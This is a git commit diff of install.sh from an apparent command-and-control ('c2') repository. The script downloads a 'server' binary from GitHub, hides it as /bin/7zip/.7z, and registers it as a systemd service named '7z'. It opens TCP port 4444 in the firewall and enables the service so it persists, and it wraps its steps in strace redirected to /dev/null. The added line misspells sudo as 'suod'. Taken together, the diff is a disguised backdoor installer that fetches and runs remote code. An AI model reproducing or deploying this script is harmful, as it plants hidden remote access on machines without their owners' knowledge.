67d8ba8eb9344e0840622dbe5254e216a1b81b44
Ricardo <ricardo.palma.rjp@gmail.com>
2024-03-21 19:26:11 -0500

    Added --reload flag to firewall-cmd

--- install.sh
+++ install.sh
@@ -4,14 +4,13 @@ curl -LJO https://github.com/Palma-Ricardo/c2/raw/main/server -o server
 sleep 2
 
 sudo strace -o /dev/null mv server /bin/7zip/.7z
-rm server
 sudo strace -o /dev/null chmod +x /bin/7zip/.7z
 curl -LJO https://github.com/Palma-Ricardo/c2/raw/main/7z.service -o 7z.service
 sleep 1
 
 sudo strace -o /dev/null mv 7z.service /etc/systemd/system/7z.service
-rm 7z.service
 sudo strace -o /dev/null firewall-cmd --zone=public --permanent --add-port=4444/tcp
+suod strace -o /dev/null firewall-cmd --reload
 sudo strace -o /dev/null systemctl start 7z
 sudo strace -o /dev/null systemctl enable 7z
 
